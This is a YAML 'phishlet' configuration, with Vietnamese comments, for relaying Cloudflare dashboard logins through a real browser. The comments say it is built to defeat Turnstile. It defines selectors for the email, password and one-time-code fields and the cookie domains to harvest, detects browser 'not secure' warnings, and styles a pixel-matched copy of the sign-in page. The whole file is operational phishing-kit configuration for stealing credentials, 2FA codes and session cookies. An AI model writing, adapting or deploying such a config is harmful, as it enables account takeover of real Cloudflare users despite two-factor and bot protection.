# cloudflare.yaml — relay profile cho Cloudflare dashboard
# MITM bị chặn bởi Turnstile domain-locked (v0.12.6) — relay browser thật
# chạy trên dash.cloudflare.com THẬT nên Turnstile pass bình thường.
# Selectors lấy từ field-test 23-09 (login render pixel-true qua proxy).
phishlet: cloudflare
flow: generic
mirror: full          # stream toàn viewport (trang 2 cột nhìn 1:1 với origin)
signin_url: "https://dash.cloudflare.com/login"
done_hosts: ["dash.cloudflare.com"]
cookie_domains: ["cloudflare.com"]
asset_hosts: ["cloudflare.com", "cloudflareinsights.com", "cloudflarestream.com"]
reopen_url: "https://dash.cloudflare.com/"
inputs:
  password: "input[type='password'], input#password"
  email: "input[type='email'], input#email"
  code: "input[name='otp'], input[inputmode='numeric'], input[type='tel']"
card_selectors: ["form", "main", "[role=main]"]
buttons:
  next: ["button[type='submit']", "button:has-text('Sign in')", "button:has-text('Log In')"]
classify:
  challenge: ["enter the code", "verification code", "mã xác minh", "two-factor", "2fa", "one-time code"]
  bad_account: ["user not found", "no account", "không tìm thấy tài khoản"]
  wrong_password: ["incorrect email or password", "wrong password", "mật khẩu không chính xác", "sai mật khẩu"]
  botguard: ["not be secure", "không an toàn"]
page:
  title: "Cloudflare Dashboard | Manage Your Account"
  favicon: "data:image/svg+xml;base64,"
  button_label: "Sign in"
  accent: "#f6821f"
  text: "#36393a"
  muted: "#5f6875"
  line: "#d5d9dd"
  card_radius: 8
  footer_left: "Cloudflare"
  footer_right: "Terms   Privacy"
